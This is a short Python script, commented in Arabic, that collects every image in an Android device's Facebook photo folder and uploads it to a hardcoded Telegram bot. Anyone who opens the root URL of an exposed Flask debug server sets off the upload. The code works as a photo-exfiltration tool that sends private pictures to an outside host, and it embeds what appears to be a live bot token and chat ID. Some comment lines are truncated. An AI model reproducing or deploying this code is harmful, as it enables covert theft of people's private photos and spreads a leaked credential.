import requests
import os

# دالة لإرسال صورة إلى تلجرام
def send_image_to_telegram(telegram_token, chat_id, image_path):
    url = f"https://api.telegram.org/bot{telegram_token}/sendPhoto"
    payload = {
        'chat_id': chat_id
    }
    with open(image_path, 'rb') as image_file:
        files = {
            'photo': image_file
        }
        response = requests.post(url, data=payload, files=files)
    return response.json()

# مسار المجلد الذي يحتوي على الصور
IMAGE_DIRECTORY = '/storage/emulated/0/DCIM/Facebook/'  # ضع هنا المسار إلى>

# إعداد بوت تلجرام
TELEGRAM_TOKEN = '7268082324:AAHZwMktcO0leSxjDUlXGv9nFnyG1Kj8YB0'  # ضع هنا>
CHAT_ID = 1678666185  # ضع هنا الـ chat ID الذي تريد إرسال الرسالة إليه

# البحث عن جميع الصور في المجلد
def find_images(directory):
    image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp']  # أنواع ا>
    images = []
    for root, dirs, files in os.walk(directory):  # استخدام os.walk لاستعرا>
        for file in files:
            if any(file.lower().endswith(ext) for ext in image_extensions):
                images.append(os.path.join(root, file))
    return images

# إرسال جميع الصور إلى تلجرام
def send_all_images_to_telegram():
    images = find_images(IMAGE_DIRECTORY)
    for image_path in images:
        print(f"إرسال الصورة: {image_path}")
        response = send_image_to_telegram(TELEGRAM_TOKEN, CHAT_ID, image_pa>
        if response.get('ok'):
            print(f"تم إرسال الصورة: {image_path}")
        else:
            print(f"فشل إرسال الصورة: {image_path}")

# إنشاء خادم ويب باستخدام Flask
from flask import Flask

app = Flask(__name__)

@app.route('/')
def send_images():
    # إرسال جميع الصور إلى تلجرام
    send_all_images_to_telegram()
    return "تم إرسال جميع الصور إلى تلجرام!"

if __name__ == '__main__':
    app.run(debug=True, host ='0.0.0.0', port=5001)

